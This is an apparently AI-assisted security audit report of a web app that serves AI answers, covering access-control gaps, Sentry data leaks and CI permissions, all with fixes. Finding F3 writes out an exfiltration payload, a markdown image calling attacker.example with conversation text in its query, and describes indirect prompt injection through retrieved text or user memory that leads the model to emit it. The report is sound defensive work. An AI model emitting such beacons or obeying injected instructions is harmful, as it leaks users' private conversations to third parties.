# Security audit, October 2026

> **Disclaimer.** This is an AI-assisted audit (Claude Code, one session, 2026-10-16) of code the owner authorized it to read, plus passive GET/HEAD checks of shelah.org and active tests against a local instance with mocked providers. It is **not** a licensed penetration test, carries no assurance, and covers only what is listed below. [Section 6](#6-what-could-not-be-tested-and-why) says what was *not* covered. It does not replace or overwrite [`AI_SECURITY_REVIEW.md`](AI_SECURITY_REVIEW.md).

## 1. Summary

**Method.** Attack-surface map (routes by auth class), then category by category. Each finding was proven by a local test or an exact code path; unsubstantiated suspicions were dropped. No secret values were read or recorded (locations only). Production was touched with GET/HEAD only, and no AI route was called.

**Result.** Nine findings: seven fixed and two open. The two open ones are informational. The one HIGH finding (any signed-in account could read every reader's feedback comments) is fixed and covered by a regression test.

| Severity | Count | Fixed | Open |
|----------|------:|------:|-----:|
| HIGH     | 1 | 1 | 0 |
| MEDIUM   | 2 | 2 | 0 |
| LOW      | 4 | 4 | 0 |
| INFO     | 2 | 0 | 2 |
| **Total** | **9** | **7** | **2** |

**Operator action.** Set `ADMIN_USER_IDS` in Vercel to your Clerk user id. Until it is set, every diagnostics route (including the feedback digest) answers 403 for everyone, you included.

## 2. Findings

Severity is a text label so it survives copy, print and screen readers: HIGH, MEDIUM, LOW, INFO. "Fixed in commit" lists every commit that carries the fix.

| ID | Severity | Title | Status | Location (file:line) | Fixed in commit |
|----|----------|-------|--------|----------------------|-----------------|
| [F1](#f1-high-feedback-digest-readable-by-any-signed-in-user) | HIGH | `/api/devtools/feedback-digest` readable by any signed-in account | Fixed | `backend/routes_devtools.py:50`, `:57`, `:166` | `51cf53f` |
| [F2](#f2-medium-question-text-in-sentry-events-via-stack-frame-locals) | MEDIUM | Sentry captured stack-frame locals, including the user's question | Fixed | `backend/logging_setup.py:146` | `51cf53f` |
| [F3](#f3-medium-image-beacon-exfiltration-through-ai-answers) | MEDIUM | Markdown images in AI answers allow data-exfil beacons (CSP `img-src https:`) | Fixed (client and server); CSP narrowing still open | `static/js/shell.js:508`, `backend/claude.py:1027`, `backend/csp.py:117` | `51cf53f` (client), `bd7be17` (server) |
| [F4](#f4-low-workflows-without-permissions) | LOW | CI workflows had no `permissions:` block | Fixed | `.github/workflows/ci.yml:10`, `.github/workflows/rls-verify.yml:24` | `51cf53f` |
| [F5](#f5-low-sync-jwks-lookup-on-the-event-loop) | LOW | JWKS verification is synchronous inside async paths | Fixed | `backend/auth.py:58`, `asgi.py:1109`, `backend/rate_limit.py:561` | `bd7be17` |
| [F6](#f6-low-budget-rpc-grants) | LOW | `check_and_reserve_user_budget` has no explicit `REVOKE` from `anon`/`authenticated` | Fixed (SQL run in Supabase by the operator) | `scripts/sql/check_and_reserve_user_budget.sql:127` | `bd7be17` |
| [F7](#f7-low-other-devtools-routes) | LOW | Other `/api/devtools/*` and `/api/stack/health` routes accept any signed-in account | Fixed | `backend/routes_devtools.py:75`, `:247`, `:323`, `:428` | `bd7be17` |
| [F8](#f8-info-audience) | INFO | Clerk `aud` is only checked when `CLERK_AUDIENCE` is set | Open (documented) | `backend/auth.py:59` | none |
| [F9](#f9-info-hash-used-as-a-cache-key) | INFO | bandit B324: MD5 used as a cache key | Open (cosmetic) | `backend/sefaria_library.py:158` | none |

## 3. Finding details

### F1 (HIGH): feedback digest readable by any signed-in user

- **Where:** `backend/routes_devtools.py`, `feedback_digest` (was `@require_clerk_auth` only).
- **Impact:** `require_clerk_auth` proves *an* account, not *the operator*. Anyone who signed up could `GET /api/devtools/feedback-digest?limit=200` and read every reader's free-text feedback comments and row metadata (`select("*")`). The docstring called the route "auth-gated"; that held only against anonymous callers.
- **Proof:** `tests/test_security_audit_2026_10.py::test_f1_*`. Before the fix an ordinary `sub` got 200; now it gets 403.
- **Fix:** `_is_admin_user()` checks the Clerk `sub` against `ADMIN_USER_IDS` (comma-separated) and fails closed when the variable is unset. The check later became the shared `require_admin` decorator (F7).

### F2 (MEDIUM): question text in Sentry events via stack-frame locals

- **Where:** `backend/logging_setup.py`, `_build_sentry_init_kwargs`. `_scrub_error_context` redacts only *context keys*; the SDK's default `include_local_variables=True` attaches frame locals separately.
- **Impact:** any exception inside `ask_async` (`asgi.py`, with `payload` and `question` locals) shipped the raw question to Sentry. That contradicts the privacy posture (`send_default_pii=False`; medical and marital questions).
- **Proof:** a local probe with a capturing transport found the question at `stacktrace.frames[0].vars.payload`, `.vars.question` and `frames[1].vars.a[0]`. Regression tests: `test_f2_question_never_reaches_sentry_event` (end to end through `/ask`) and `test_f2_sentry_kwargs_disable_local_variables`.
- **Fix:** `"include_local_variables": False`.

### F3 (MEDIUM): image beacon exfiltration through AI answers

- **Where:** `static/js/shell.js`, `renderAnswerMarkdown` (DOMPurify with the HTML profile allowed `<img>`); CSP `img-src 'self' data: https:` at `backend/csp.py:117`.
- **Impact:** an indirect prompt injection in retrieved text (Sefaria, Wikipedia, web) or in a user memory could make the model emit `![](https://attacker.example/c.png?q=<conversation text>)`. The browser fetches it on render, leaking text to a third party with no click. It needs a successful injection first, hence MEDIUM. `retrieval_guard` is a phrase heuristic, not a guarantee.
- **Fix (client):** `FORBID_TAGS` (`img`, `picture`, `source`, `video`, `audio`, `form`, `input`, `textarea`, `button`, `select`, `style`, `link`, `meta`, `iframe`, `object`, `embed`, `svg`, `math`) on the answer sanitizer; `static/min/` rebuilt. Regression: `test_f3_answer_renderer_forbids_beacon_tags`, a static check of the source (a real-browser run was **not** done; see section 6).
- **Fix (server):** `backend/claude.py::_sanitize_model_output` strips markdown images (inline and reference style) and `<img>` tags, keeping the alt text. Test: `test_f3_model_output_loses_embedded_images`.
- **Still open:** narrowing CSP `img-src` from `https:` to the hosts actually used. Cross-lane note: the client fix touches frontend JS.

### F4 (LOW): workflows without `permissions:`

`ci.yml` and `rls-verify.yml` inherited the repository's default token scope. Both now declare `permissions: contents: read`. Actions were already pinned by SHA. Test: `test_f4_workflows_declare_least_privilege`.

### F5 (LOW): sync JWKS lookup on the event loop

`backend/auth.py` `get_signing_key_from_jwt` is a blocking HTTP fetch on a cold cache and, in PyJWT's `PyJWKClient`, on **every unknown `kid`**. `RateLimitMiddleware` (llm and account classes) and `ask_async` called it directly on the loop, *before* the rate-limit check, so a stream of bearer tokens with random `kid`s could stall the loop and hammer Clerk's JWKS endpoint.

- **Fix:** both call sites now use `asyncio.to_thread(extract_user_id_from_bearer_value, ...)`.
- **Test:** `test_f5_bearer_verification_runs_off_the_event_loop`.
- **Not done:** a negative cache for unknown `kid`s.

### F6 (LOW): budget RPC grants

`scripts/sql/check_and_reserve_user_budget.sql` revoked `EXECUTE` only from `PUBLIC`; Supabase's default privileges grant it to `anon` and `authenticated` directly. The function is not `SECURITY DEFINER` and `ai_usage_log` has RLS enabled with no policy (`docs/DATABASE.md:157,384`), so an anon insert would have been denied by RLS anyway.

The operator ran this in the Supabase SQL Editor on 2026-10-16 (not independently verified by me):

```sql
REVOKE EXECUTE ON FUNCTION public.check_and_reserve_user_budget(TEXT, TEXT, NUMERIC, NUMERIC) FROM anon, authenticated;
```

The statement is now recorded in the setup SQL (line 127 of the file above), so a rebuilt database matches.

### F7 (LOW): other devtools routes

`stack_health`, `/api/health`, `devtools_reliability` and `devtools_rls_audit` revealed rate-limit thresholds, configuration state and RLS audit data to any signed-in account. A shared `require_admin` decorator (the F1 allowlist) now guards all four plus the feedback digest. `scripts/verify_integrations.py` already treats 401/403 as "up", and no frontend code calls these routes. Test: `test_f7_diagnostics_need_the_operator`.

### F8 (INFO): audience

`_verify_clerk_token` pins `algorithms=["RS256"]`, verifies `exp` and `iss`, and checks `aud` only when `CLERK_AUDIENCE` is set. Project memory records that the dev Clerk template lacks `aud`, so this is understood. The forged-token matrix (alg `none`, HS256 key confusion, expired, wrong issuer) is rejected (`test_jwt_forgeries_rejected`); a valid RS256 token is accepted (`test_jwt_valid_rs256_accepted`).

### F9 (INFO): hash used as a cache key

bandit's other hits were reviewed and are false positives or non-security (test helpers, fixed-host URL building). `sefaria_library.py:158` builds a cache key with `hashlib.md5` and could pass `usedforsecurity=False` to silence B324.

## 4. OWASP Top 10 (2021) mapping

| # | Category | Verdict | Evidence |
|---|----------|---------|----------|
| A01 | Broken access control | F1 and F7 found. Otherwise sound: history GET/DELETE filter by owner in the query (`backend/routes_user.py:450-505`, `backend/device_identity.py:170`), 404 for both missing and not-yours; UUID-validated ids; share and conversation routes owner-scoped; cron routes use `hmac.compare_digest` and fail closed with 503 | tests, code read |
| A02 | Cryptographic failures | TLS via Vercel; device id stored as `device:<sha256>`; Svix webhook verification is constant-time; no secrets committed (gitleaks clean over 622 commits) | scans |
| A03 | Injection | SQL goes through PostgREST/supabase-py (parameterised); the one plpgsql function whitelists its `p_key_column`; SSR text pages use a parser-based sanitizer and `tojson` embedding (`backend/text_ssr.py`); answers are sanitized by DOMPurify (F3) | code read |
| A04 | Insecure design | Guest cap and per-class rate limits; the llm class fails closed if Redis is down; budget gates and the Gemini cooldown exist. Anonymous `/ask` is an accepted risk (section 5) | code read |
| A05 | Security misconfiguration | CSP with per-response script hashes; `form-action 'self'`; see F3 for `img-src`; no open redirect found passively (including the vercel.app redirect) | prod GET/HEAD |
| A06 | Vulnerable components | `pip-audit`: no known vulnerabilities. `npm audit`: 2 moderate, both dev-tool advisories, not shipped | scans |
| A07 | Authentication failures | JWT matrix in F8; no password handling in the app (Clerk) | tests |
| A08 | Integrity failures | Actions pinned by SHA; lockfiles committed; FullCalendar SRI; F4 | code read |
| A09 | Logging and monitoring | F2 fixed; Sentry `send_default_pii=False`; rate-limit and error-bot alerting exist | probe |
| A10 | SSRF | **Not exploitable:** every outbound host in `backend/utils/search_provider.py` and the library proxies is a constant; user input reaches only path and query components (quoted) | code read |

## 5. Accepted risks

Not re-raised; no new evidence.

- `CLERK_ENFORCE_AUTH=false` in production: anonymous `/ask` is open on purpose, compensated by the guest cap and rate limits.
- WAF rule 3 stays on Log (Deny breaks PUT/PATCH/DELETE).
- `anon` has no SELECT on `answer_feedback` by design (42501 is not a missing grant).
- RLS Live Verification workflow failures are stale Clerk session ids, not an RLS regression.
- Turnstile is built but off.

### Verified good

- **Service worker:** private API prefixes (`/api/user/`, `/api/auth/`, `/api/conversations`, `/api/public/answer`, and others) are excluded from caching, non-GET requests are skipped, and `message` events require the same origin (`static/service-worker.js:46-67,362-379`).
- **Cache tiers:** `/api/public/answer` stays at `no-store`.
- **Cron routes:** secrets are compared in constant time.

## 6. What could not be tested, and why

- **Production behaviour behind login**, real Clerk/Supabase/Vercel/WAF dashboard configuration, actual grants on live Postgres (F6), and Sentry project settings: out of reach under the ground rules.
- **A real browser exfiltration run** for F3. The fix is verified by a source check, not by rendering a hostile answer.
- **Rate-limit and guest-cap behaviour under load or header spoofing on production:** forbidden. The header order (`X-Vercel-Forwarded-For` first) is trustworthy only because Vercel overwrites those headers; not verified here.
- **Real prompt-injection success rates** against Gemini and Claude: it would cost provider budget. Only the code paths (`retrieval_guard`, tool gating) were read.
- **Not read in depth this pass:** Flask `/ask` in `app.py`, the `cost_gates.py` and `health_check.py` cooldown internals, `routes_privacy.py` retention enforcement, sitemap and `llms.txt`, and a line-by-line re-verification of every claim in `AI_SECURITY_REVIEW.md`. Treat these as unaudited, not as clean.
- Graph and docs were consulted with grep and direct reads; no graphify queries were run for flow tracing.

## 7. Test-suite state

At the time of the audit the full suite was 5518 passed, 0 failed, and `ruff check` was clean.

One test, `tests/test_gemini_cooldown.py::TestOpeningTheCircuit::test_checking_gemini_never_touches_the_network`, failed earlier in the session on a clean `HEAD` and then passed without any change. It froze time at a fixed date and opened the circuit outside that frozen clock, so it depended on the wall clock. The audit did not change it. It was fixed afterwards in `106c8d9` (see [`CODE_AUDIT_2026-10.md`](CODE_AUDIT_2026-10.md), fix 1).

## 8. Fix summary

| Area | Files | Findings | Commit |
|------|-------|----------|--------|
| Operator gate | `backend/routes_devtools.py` | F1, F7 | `51cf53f`, `bd7be17` |
| Sentry | `backend/logging_setup.py` | F2 | `51cf53f` |
| Answer sanitizing | `static/js/shell.js`, `static/min/`, `backend/claude.py` | F3 | `51cf53f`, `bd7be17` |
| CI | `.github/workflows/*.yml` | F4 | `51cf53f` |
| Event loop | `asgi.py`, `backend/rate_limit.py` | F5 | `bd7be17` |
| Database grants | `scripts/sql/check_and_reserve_user_budget.sql` | F6 | `bd7be17` |

Tests: `tests/test_security_audit_2026_10.py`, plus `tests/test_routes_devtools.py` (sets `ADMIN_USER_IDS` for the digest class).

New environment variable: `ADMIN_USER_IDS`, documented in [`ENVIRONMENT.md`](ENVIRONMENT.md).
